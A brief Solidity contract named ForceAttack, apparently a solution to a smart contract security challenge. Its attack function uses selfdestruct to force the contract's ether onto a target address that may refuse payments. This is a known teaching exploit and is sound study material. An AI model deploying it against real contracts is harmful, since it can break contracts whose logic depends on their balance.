// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    
    constructor() payable {}

    function attack(address payable _force) public  {
        selfdestruct(_force); // deprecated at this time because it is voliating the concept of immutability.
    }
}